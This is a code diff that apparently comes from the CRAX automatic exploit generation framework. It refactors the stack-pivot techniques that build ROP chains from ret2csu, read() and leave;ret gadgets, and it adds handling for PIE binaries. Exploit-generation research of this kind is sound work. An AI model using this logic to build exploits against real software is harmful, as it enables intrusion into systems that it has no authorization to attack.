@@ -60,7 +60,10 @@ void BasicStackPivot::resolveRequiredGadgets() {
 
 
 std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
-    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = dynamic_cast<Ret2csu *>(g_crax->getTechnique("Ret2csu"));
     assert(ret2csu);
 
     // RBP
@@ -70,16 +73,16 @@ std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
     // Write the 2nd stage ROP payload via read() to `pivot_dest`
     // via ret2csu(read, 0, pivot_dest, 1024).
     RopSubchain part2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(elf, "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
+        BaseOffsetExpr::create(exploit, "pivot_dest"),
         ConstantExpr::create(1024, Expr::Int64))[0];
 
     // Perform stack pivoting.
     RopSubchain part3 = {
-        BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rbp_ret"),
-        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
-        BaseOffsetExpr::create(g_crax->getExploit(), "", "leave_ret")};
+        BaseOffsetExpr::create(exploit, "pop_rbp_ret"),
+        BaseOffsetExpr::create(exploit, "pivot_dest"),
+        BaseOffsetExpr::create(exploit, "leave_ret")};
 
     RopSubchain ret;
     ret.reserve(part1.size() + part2.size() + part3.size());
@@ -110,24 +113,25 @@ AdvancedStackPivot::AdvancedStackPivot()
 
 
 void AdvancedStackPivot::initialize() {
-    // XXX: This is gross, refactor this shit... :(
-    static bool initialized = false;
+    auto __dynRop = dynamic_cast<DynamicRop *>(g_crax->getModule("DynamicRop"));
+    assert(__dynRop && "AdvancedStackPivot relies on DynamicRop module");
 
-    if (initialized) {
+    auto modState = g_crax->getPluginModuleState(g_crax->getCurrentState(), __dynRop);
+    if (modState->initialized) {
         return;
     }
 
-    initialized = true;
-    auto __dynRop = dynamic_cast<DynamicRop *>(g_crax->getModule("DynamicRop"));
-    assert(__dynRop && "AdvancedStackPivot relies on DynamicRop module");
+    modState->initialized = true;
     auto &dynRop = *__dynRop;
 
     // Resolve ret2LeaRbp.
     // XXX: from balsn: this is a good research topic.
     const auto &readCallSiteInfo = *m_readCallSites.rbegin();
+    const auto &exploit = g_crax->getExploit();
+
     int rbpOffset = 0;
     uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address, rbpOffset);
-    uint64_t pivotDest = g_crax->getExploit().getSymbolValue("pivot_dest");
+    uint64_t pivotDest = exploit.getElf().getBase() + exploit.getSymbolValue("pivot_dest");
 
     ref<Expr> rbp1 = ConstantExpr::create(pivotDest, Expr::Int64);
     ref<Expr> rip1 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);
@@ -173,7 +177,10 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     assert(m_readCallSites.size() &&
            "AdvancedStackPivot requires at least one call site of read@libc");
 
-    auto *ret2csu = dynamic_cast<Ret2csu *>(g_crax->getTechnique("Ret2csu"));
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    auto ret2csu = dynamic_cast<Ret2csu *>(g_crax->getTechnique("Ret2csu"));
     assert(ret2csu && "Ret2csu object not found");
 
     // At this point, a stack-buffer overflow should take place inside libc,
@@ -184,16 +191,16 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     // ret2csu once.
     RopSubchain part1;
     for (size_t i = 0; i < 6; i++) {
-        ref<Expr> e0 = BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rsi_r15_ret");
+        ref<Expr> e0 = BaseOffsetExpr::create(exploit, "pop_rsi_r15_ret");
         ref<Expr> e1 = AddExpr::alloc(
-                BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
+                BaseOffsetExpr::create(exploit, "pivot_dest"),
                 AddExpr::alloc(
                         ConstantExpr::create(8, Expr::Int64),
                         MulExpr::alloc(
                                 ConstantExpr::create(0x30, Expr::Int64),
                                 ConstantExpr::create(i + 1, Expr::Int64))));
         ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
-        ref<Expr> e3 = BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read");
+        ref<Expr> e3 = BaseOffsetExpr::create(elf, "sym", "read");
 
         part1.push_back(e0);
         part1.push_back(e1);
@@ -201,13 +208,23 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
         part1.push_back(e3);
     }
 
+    // When PIE is enabled, _DYNAMIC doesn't contain the runtime address of _fini,
+    // so we have to manually write one (in this case, we'll write one in .bss)
+    if (g_crax->getExploit().getElf().getChecksec().hasPIE) {
+        auto &exploit = g_crax->getExploit();
+        uint64_t elfBase = exploit.getElf().getBase();
+        uint64_t pivotDest = elfBase + exploit.getSymbolValue("pivot_dest");
+        ret2csu->setGadget2CallTarget(pivotDest + 8 + 0x30);
+        part1[6] = BaseOffsetExpr::create(elf, "sym", "_fini");
+    }
+
     // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
     // read(0, pivot_dest + 0x30 * 7, 0x400).
     RopSubchain part2 = ret2csu->getRopSubchains(
-            BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
+            BaseOffsetExpr::create(elf, "sym", "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
-                    BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
+                    BaseOffsetExpr::create(exploit, "pivot_dest"),
                     MulExpr::alloc(
                             ConstantExpr::create(0x30, Expr::Int64),
                             ConstantExpr::create(7, Expr::Int64))),
@@ -286,7 +303,7 @@ uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr,
     }
 
     assert(ret && "determineReturnAddr(): no suitable candidates?");
-    return ret - g_crax->getExploit().getElf().getBase();
+    return ret;
 }
 
 }  // namespace s2e::plugins::crax
